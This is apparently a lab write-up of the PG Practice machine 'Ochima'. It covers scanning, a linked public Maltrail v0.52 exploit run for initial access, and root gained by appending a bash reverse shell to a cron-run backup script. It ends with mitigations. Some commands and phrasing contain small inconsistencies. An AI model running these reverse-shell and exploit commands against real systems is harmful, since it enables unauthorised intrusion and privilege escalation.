## Introduction

In this walkthrough, I worked on the intermediate Linux machine *Ochima* from PG Practice. During initial enumeration, I discovered that **port 8338** was open and hosting **Maltrail v0.52**. I found a **public exploit** for this specific version and used it to gain **to do** to the machine.

Upon further enumeration, I discovered a **file owned by root but writable by my user**. Suspecting it was being executed as part of a scheduled job, I ran **pspy** to monitor background processes. Once confirmed, I appended a **reverse shell payload** to the file. When the scheduled job ran under the root context, it triggered my payload and granted me a **root shell**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)

We usually skip SSH.

## Web

### Port 80

Version - Apache httpd 2.4.52 ((Ubuntu))

**Gobuster Directory scan**

```bash
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -t 30 -b 403,404,400 -x .php
```

### Port 8338

## Exploitation

We can easily see the version of the application I am gonna search for public exploits that we can use against this version. Searching for `Maltrail v0.52 exploit` I am greeted with many sources, but i chose one github [repo](https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py?source=post_page-----702633e20940---------------------------------------) that has most stars:

```bash
python3 snooker.py 192.168.45.227 443 http://192.168.184.32:8338/
```

Running exploit on port 443 didn’t work, that’s why I have chosen target’s open port 80.

```bash
python3 snooker.py 192.168.45.227 443 http://192.168.184.32:8338/
```

## Privilege Escalation

Make a shell fully interactive using python one-liner:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
home/snort/etc/ssh/ssh_host_rsa_key
/home/snort/etc/ssh/ssh_host_ed25519_key
/home/snort/etc/ssh/ssh_host_ecdsa_key
/home/snort/etc/ssh/ssh_host_dsa_key
/home/snort/etc_backup.tar
```

I tried using `RSA` key but it didn’t work, then I checked my Full Port Scan to see which cryptographic algorithms are used for SSH protocol. I saw `ECDSA` and `ED25519`.

Bu unfortunately didn’t work either one.

Listing our writable files I can see `/var/backups/etc_Backup.sh` file:

```bash
find / -path /proc -prune -o -type f -perm -o+w **2**>/dev/null
```

The file is owned by root, but we have all access to it, let’s inspect if it is executed as cron job by root with pspy64 executable.

```bash
timeout 5m ./pspy
```

![image.png](image%2011.png)

Yes, it is executed as root, let’s inject there our reverse shell.

```bash
echo 'bash -i >& /dev/tcp/192.168.45.227/8338 0>&1' >> /var/backups/etc_Backup.sh
```

Now we got a shell as root.

## Mitigation

- **Update Vulnerable Services:** Regularly patch services like Maltrail to prevent exploitation of known vulnerabilities.
- **Restrict File Permissions:** Avoid giving write permissions to low-privileged users for files owned or executed by root.
- **Monitor Cron Jobs:** Periodically audit and monitor scheduled jobs to ensure they are secure and not exposed to modification.
- **Implement Least Privilege:** Ensure users only have the minimum level of access required for their role or function.
